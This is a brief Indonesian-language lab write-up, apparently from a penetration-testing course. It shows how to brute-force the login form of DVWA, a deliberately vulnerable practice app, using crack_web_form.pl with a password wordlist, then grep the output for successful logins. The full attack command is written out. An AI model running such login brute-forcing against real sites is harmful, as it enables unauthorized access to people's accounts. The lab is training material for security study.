### Using Tamper Data with crack_web_form.pl


1. Proof of Lab
   * **Langkah:**
     1. Jalankan command crack_web_form.pl pada direktori `/pentest/passwords/cwf`
     2. `./crack_web_form.pl -U admin -P password.txt -http "http://10.151.34.215/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Login failed"`
   * ![](/assets/3. Hasil Akhir.PNG)
   
   * **Tampilkan hasil:**
     1. Perhatikan hasil crack yang telah dilakukan, untuk menampilkan hasil percobaan crack yang success jalankan command di bawah:
     2. `grep Successful crack_output.txt`
   * ![](/assets/3. Hasil Akhir.PNG)

